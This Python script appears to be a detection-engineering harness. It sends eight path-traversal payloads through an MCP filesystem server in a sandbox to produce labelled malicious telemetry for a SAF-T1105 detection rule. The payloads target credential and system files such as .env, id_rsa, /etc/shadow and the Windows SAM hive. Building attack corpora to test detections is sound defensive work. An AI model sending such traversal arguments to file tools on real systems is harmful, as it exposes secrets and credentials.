#!/usr/bin/env python3
"""Phase 6 slice 3 -- path traversal via file tool (SAF-T1105), the first
brand-new technique authored through the Detection-as-Code framework, not
migrated into it. Grounded live against
github.com/SAFE-MCP/safe-mcp's techniques/SAF-T1105/README.md before
writing anything -- see docs/PHASE6-T1105-REPORT.md for the citation.

Deliberately NOT built on attacks/harness.py (kept frozen since Phase 4 for
reproducibility, per docs/STATE-OF-PROJECT.md) -- this is a self-contained,
independent tool, same open_session()/call() shape, no shared import,
following the exact precedent attacks/evasion_harness.py already set for
adding new attack code without touching a frozen file.

UNLIKE evasion_harness.py (which deliberately targets a scratch path,
never the canonical telemetry.jsonl, because it measures evasions of
ALREADY-MEASURED rules), this harness targets the canonical
telemetry.jsonl directly -- the same file attacks/harness.py's own
original attacks and their variants were additively appended to across
Phases 3a/3b. SAF-T1105 is a new technique's own genuine attack corpus,
not an evasion of an existing rule, so it follows harness.py's own
established growth pattern, not evasion_harness.py's exception. This
choice is what lets detections/SAF-T1105_path_traversal/detection.yaml use
the same "live:telemetry#label=malicious&scenario_id=X" fixture convention
every other migrated Detection already uses, rather than inventing a
fourth kind.

Each variant below uses the real, pinned MCP filesystem server
(@modelcontextprotocol/server-filesystem) against the real /app/sandbox
root -- the same server attacks/harness.py's credential_exfil attack
already uses -- so the traversal argument is sent through the real proxy
and the real MCP client/server stack. Whether the underlying server
actually permits or blocks the resulting read is irrelevant to what this
detection targets: the rule matches the tool call's ARGUMENT (attempted
traversal), not the read's success -- exactly the IoC upstream's own
README describes ("File Access Patterns: ... multiple ../ sequences in
file paths"), independent of outcome.

Usage: python3 attacks/path_traversal_harness.py --log-path <path>
(Run inside the `agent` container, targeting the live canonical
/var/log/mcp-detect/telemetry.jsonl, to match how every prior phase's new
attack variants were added to the same growing corpus.)
"""
import argparse
import asyncio
import sys

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

SANDBOX = "/app/sandbox"
SCENARIO = "path_traversal"


def open_session(server_command: list[str], log_path: str, task_id: str):
    proxy_command = [
        "python3", "proxy/proxy.py",
        "--log-path", log_path,
        "--label", "malicious",
        "--scenario-id", SCENARIO,
        "--task-id", task_id,
        "--",
    ] + server_command
    server_params = StdioServerParameters(command=proxy_command[0], args=proxy_command[1:])
    return stdio_client(server_params)


async def call(session: ClientSession, tool_name: str, arguments: dict) -> str:
    result = await session.call_tool(tool_name, arguments)
    parts = []
    for block in result.content:
        if getattr(block, "type", None) == "text":
            parts.append(block.text)
    return "\n".join(parts) if parts else ""


# (task_id suffix, traversal path, why this variant) -- genuine variety in
# depth and target, not one specimen. v01/v02 deliberately overlap 100101's
# own sensitive-suffix match (the disjointness adjudication case named in
# the slice-3 instructions); the rest are disjoint traversal-only targets,
# varying depth and separator style, matching upstream's own "Common
# Vulnerable Paths" examples (techniques/SAF-T1105/README.md).
VARIANTS = [
    ("v01_env_overlap", "../../.env",
     "deliberately overlaps 100101's .env suffix -- the disjointness centerpiece"),
    ("v02_id_rsa_overlap", "../../id_rsa",
     "deliberately overlaps 100101's id_rsa suffix -- second disjointness case"),
    ("v03_etc_passwd_deep", "../../../../../../etc/passwd",
     "upstream's own canonical example depth/target, README.md 'Example Scenario'"),
    ("v04_etc_hosts_shallow", "../etc/hosts",
     "shallow (single-level) traversal -- depth variety"),
    ("v05_ssh_known_hosts", "../../.ssh/known_hosts",
     "SSH directory but NOT the id_rsa suffix -- disjoint from 100101 by name, not just by negate"),
    ("v06_config_database", "../config/database.yml",
     "upstream's own cited example (README.md 'Common Vulnerable Paths')"),
    ("v07_windows_style", "..\\..\\windows\\system32\\config\\sam",
     "backslash-separator traversal -- tests the rule's \\\\ alternative"),
    ("v08_etc_shadow_deep", "../../../../../../etc/shadow",
     "second deep-traversal target, upstream's own second cited example"),
]


async def attack_path_traversal(log_path: str) -> None:
    """SAF-T1105: one session per variant, each a single tools/call against
    the real filesystem server with a traversal-shaped path argument."""
    print("[attack] === path_traversal (SAF-T1105) ===", file=sys.stderr)
    fs_command = ["npx", "-y", "@modelcontextprotocol/server-filesystem@2026.7.4", SANDBOX]

    for suffix, path, why in VARIANTS:
        task_id = f"attack_path_traversal_{suffix}"
        print(f"[attack]   --- {task_id} (path={path!r}) -- {why} ---", file=sys.stderr)
        async with open_session(fs_command, log_path, task_id) as (read, write):
            async with ClientSession(read, write) as session:
                await session.initialize()
                await session.list_tools()
                try:
                    result = await call(session, "read_text_file", {"path": path})
                    print(f"[attack]     read_text_file({path!r}) -> {result[:80]!r}...", file=sys.stderr)
                except Exception as e:
                    print(f"[attack]     read_text_file({path!r}) -> error (expected -- server "
                          f"enforces its root boundary): {e}", file=sys.stderr)
    print("[attack] path_traversal complete.", file=sys.stderr)


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--log-path", required=True)
    args = parser.parse_args()
    await attack_path_traversal(args.log_path)


if __name__ == "__main__":
    asyncio.run(main())
